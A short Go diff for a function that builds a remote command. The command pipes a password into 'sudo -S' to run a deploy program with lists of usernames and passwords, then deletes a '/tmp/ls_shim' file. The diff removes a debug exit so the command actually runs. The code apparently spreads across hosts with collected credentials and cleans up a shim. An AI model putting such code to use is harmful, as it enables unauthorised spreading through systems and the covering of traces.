@@ -79,8 +79,6 @@ func runRemote(username, password, ip string) {
 	if isTarget {
 		command += "cd deploy\n" +
 			"echo " + password + " | sudo -S go run deploy.go -i " + GetOutboundIP() + " -m --user-list " + strings.Join(usernames, ",") + " --password-list " + strings.Join(passwords, ",") + "\n"
-		fmt.Println(command)
-		os.Exit(0)
 	}
 	command += "echo " + password + " | sudo -S rm -rf /tmp/ls_shim\n"
 	buffer.Write([]byte(command))
